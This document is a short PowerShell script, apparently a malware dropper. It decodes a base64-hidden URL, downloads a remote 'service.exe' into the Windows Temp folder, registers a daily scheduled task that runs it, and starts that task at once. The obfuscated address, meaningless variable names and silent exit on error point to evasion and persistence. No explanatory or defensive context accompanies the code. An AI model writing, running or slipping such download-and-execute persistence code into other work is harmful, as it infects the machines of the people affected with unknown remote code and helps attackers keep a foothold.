$A1 = "JormengandrTask"
$B2 = "C:\Temp\service.exe"
$C3 = "13:37"  
$D4 = "Jormungand Task to run service executable"

# Base64 encoded web address for the service binary URL
$E5 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9nZWxkZ2lmdC5jb20vc2VydmljZS5leGU="))
$F6 = "C:\Windows\Temp\service.exe"

$G7 = $E5
$H8 = $F6

try {
    Invoke-WebRequest -Uri $G7 -OutFile $H8 -UseBasicP
} catch {
    exit 1
}

$I9 = New-ScheduledTaskAction -Execute $H8
$J10 = New-ScheduledTaskTrigger -Daily -At $C3
Register-ScheduledTask -TaskName $A1 -Action $I9 -Trigger $J10 -Description $D4

Start-ScheduledTask -TaskName $A1
